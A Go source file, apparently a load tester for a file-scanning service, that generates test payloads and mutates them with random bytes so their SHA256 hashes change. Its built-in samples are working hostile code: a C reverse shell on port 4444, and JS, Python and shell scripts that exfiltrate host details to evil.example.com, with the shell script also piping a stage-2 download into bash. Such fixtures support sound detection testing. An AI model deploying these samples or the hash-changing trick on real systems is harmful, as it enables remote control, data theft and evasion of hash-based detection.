package main

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"math/big"
	"os"
	"path/filepath"
)

type payload struct {
	filename string
	data     []byte
}

// buildPayloads creates the set of payloads for the load test.
func buildPayloads(mode, payloadDir string) ([]payload, error) {
	if payloadDir != "" {
		return loadPayloadsFromDir(payloadDir)
	}
	return generateBuiltinPayloads()
}

// loadPayloadsFromDir reads all files from a directory as payloads.
func loadPayloadsFromDir(dir string) ([]payload, error) {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil, fmt.Errorf("read payload dir: %w", err)
	}

	var payloads []payload
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		path := filepath.Join(dir, e.Name())
		data, err := os.ReadFile(path)
		if err != nil {
			return nil, fmt.Errorf("read %s: %w", path, err)
		}
		payloads = append(payloads, payload{filename: e.Name(), data: data})
	}
	if len(payloads) == 0 {
		return nil, fmt.Errorf("no files found in %s", dir)
	}
	return payloads, nil
}

// generateBuiltinPayloads creates a set of synthetic test files.
func generateBuiltinPayloads() ([]payload, error) {
	return []payload{
		{filename: "hello.c", data: []byte(sampleC)},
		{filename: "malicious.js", data: []byte(sampleJS)},
		{filename: "setup.py", data: []byte(samplePython)},
		{filename: "install.sh", data: []byte(sampleShell)},
		{filename: "tiny.elf", data: generateMinimalELF()},
	}, nil
}

// mutatePayload creates a unique variant of the payload to defeat caching.
// It appends random bytes so the SHA256 changes.
func mutatePayload(p payload, seq int64) payload {
	// Append 32 random bytes + sequence number to change SHA256.
	extra := make([]byte, 40)
	rand.Read(extra[:32])
	binary.LittleEndian.PutUint64(extra[32:], uint64(seq))

	mutated := make([]byte, len(p.data)+len(extra))
	copy(mutated, p.data)
	copy(mutated[len(p.data):], extra)

	return payload{
		filename: fmt.Sprintf("%d_%s", seq, p.filename),
		data:     mutated,
	}
}

// randString generates a random alphanumeric string of length n.
func randString(n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, n)
	for i := range b {
		idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		b[i] = letters[idx.Int64()]
	}
	return string(b)
}

// generateMinimalELF creates a minimal valid ELF binary (x86-64, no-op).
func generateMinimalELF() []byte {
	// Minimal ELF64 that is a valid executable (exit(0)).
	// ELF header + program header + tiny code segment.
	elf := []byte{
		// ELF magic
		0x7f, 'E', 'L', 'F',
		// Class: 64-bit
		2,
		// Data: little-endian
		1,
		// Version
		1,
		// OS/ABI: Linux
		0,
		// Padding
		0, 0, 0, 0, 0, 0, 0, 0,
		// Type: ET_EXEC
		2, 0,
		// Machine: x86-64
		0x3e, 0,
		// Version
		1, 0, 0, 0,
		// Entry point: 0x400078
		0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
		// Program header offset: 64
		0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		// Section header offset: 0 (none)
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		// Flags
		0x00, 0x00, 0x00, 0x00,
		// ELF header size: 64
		0x40, 0x00,
		// Program header entry size: 56
		0x38, 0x00,
		// Number of program headers: 1
		0x01, 0x00,
		// Section header entry size: 0
		0x00, 0x00,
		// Number of section headers: 0
		0x00, 0x00,
		// Section name string table index: 0
		0x00, 0x00,

		// Program header (56 bytes)
		// Type: PT_LOAD
		0x01, 0x00, 0x00, 0x00,
		// Flags: PF_R | PF_X
		0x05, 0x00, 0x00, 0x00,
		// Offset: 0
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		// Virtual address: 0x400000
		0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
		// Physical address: 0x400000
		0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
		// File size: 0x80 (128 bytes - header + phdr + code)
		0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		// Memory size: 0x80
		0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		// Alignment: 0x200000
		0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00,

		// Code at offset 0x78 (entry point)
		// mov eax, 60 (sys_exit)
		0xb8, 0x3c, 0x00, 0x00, 0x00,
		// xor edi, edi (exit code 0)
		0x31, 0xff,
		// syscall
		0x0f, 0x05,
	}
	return elf
}

// Sample source files for built-in payloads.

const sampleC = `#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(int argc, char *argv[]) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    printf("Host: %s\n", hostname);

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return 1;

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(4444),
        .sin_addr.s_addr = INADDR_ANY,
    };

    if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(fd);
        return 1;
    }

    char buf[1024];
    while (read(fd, buf, sizeof(buf)) > 0) {
        system(buf);
    }
    close(fd);
    return 0;
}
`

const sampleJS = `const { exec } = require('child_process');
const https = require('https');
const os = require('os');
const fs = require('fs');

const info = {
    hostname: os.hostname(),
    platform: os.platform(),
    user: os.userInfo().username,
    home: os.homedir(),
};

const data = JSON.stringify(info);
const options = {
    hostname: 'evil.example.com',
    port: 443,
    path: '/exfil',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
};

const req = https.request(options, (res) => {
    let body = '';
    res.on('data', (chunk) => body += chunk);
    res.on('end', () => {
        if (body) exec(body);
    });
});
req.write(data);
req.end();
`

const samplePython = `import os
import socket
import subprocess
import platform
import json
import base64
import urllib.request

def gather_info():
    return {
        'hostname': socket.gethostname(),
        'platform': platform.platform(),
        'user': os.getenv('USER', 'unknown'),
        'cwd': os.getcwd(),
        'path': os.getenv('PATH', ''),
    }

def exfiltrate(data):
    encoded = base64.b64encode(json.dumps(data).encode()).decode()
    url = f'https://evil.example.com/c2?d={encoded}'
    urllib.request.urlopen(url)

def execute_command(cmd):
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout

if __name__ == '__main__':
    info = gather_info()
    exfiltrate(info)
`

const sampleShell = `#!/bin/bash
# Reconnaissance script
HOSTNAME=$(hostname)
UNAME=$(uname -a)
WHOAMI=$(whoami)
IP=$(ifconfig 2>/dev/null || ip addr 2>/dev/null)
ENV=$(env)
PROCS=$(ps aux)

# Exfiltrate
DATA=$(echo "$HOSTNAME|$UNAME|$WHOAMI" | base64)
curl -s "https://evil.example.com/c2?d=$DATA" -o /dev/null

# Download and execute stage 2
curl -s "https://evil.example.com/stage2.sh" | bash
`
